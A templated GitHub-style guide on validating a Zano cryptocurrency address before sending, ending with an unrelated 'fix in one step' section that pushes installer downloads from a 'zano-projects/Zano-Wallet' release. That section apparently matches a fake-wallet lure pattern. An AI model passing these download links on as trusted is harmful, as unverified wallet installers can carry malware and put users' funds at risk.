<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/02-privacy-features.webp" alt="Zano Wallet - Validate a Zano Address Before Sending" width="100%"></p>

<h1 align="center">Validate a Zano Address Before Sending</h1>

<p align="center">
<a href="https://zanowallet.io/"><img src="https://img.shields.io/badge/Website-zanowallet.io-7c5cff?style=for-the-badge" alt="Zano Wallet website"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
</p>

---

**Short answer:** Check the address format in Zano Wallet or with wallet-address-validator before sending; invalid addresses are rejected.

## You'll see this if

- You are building a payment form
- You received an address by message

## Why it happens

Validation catches typos and wrong-network addresses before funds move.

## How to fix it

1. Copy the address exactly.
2. Paste it into Zano Wallet's send field.
3. For apps, use wallet-address-validator.
4. Reject anything that fails.
5. Confirm with the recipient through a second channel.

Related reading: [How to Send ZANO Safely](./send-zano.md) and the [aliases](https://zanowallet.io/features/alias/).

## If that didn't work

If an address keeps failing, ask for an alias instead. You can also read [Register a Zano Alias (@name) in Zano Wallet](./register-zano-alias.md).

## Prevent it next time

Never trust addresses changed in a message thread; verify by voice or in person. More on the website: [security](https://zanowallet.io/security/).

## FAQ

**Does validation prove ownership?**  
No, only correct format.

**Can developers integrate it?**  
Yes, the validator library is open source.

---

## The fix in one step: install the latest Zano Wallet

The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):

[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)

| Platform | File | Version |
|---|---|---|
| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |

> [!TIP]
> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.

## Related guides

| Guide | On the website |
|---|---|
| [How to Send ZANO Safely](./send-zano.md) | [aliases](https://zanowallet.io/features/alias/) |
| [Register a Zano Alias (@name) in Zano Wallet](./register-zano-alias.md) | [security](https://zanowallet.io/security/) |
| [Avoid Fake Zano Wallet Downloads](./avoid-fake-zano-wallet-sites.md) | [download Zano Wallet](https://zanowallet.io/download/) |

---

<p align="center"><a href="https://zanowallet.io/">zanowallet.io</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
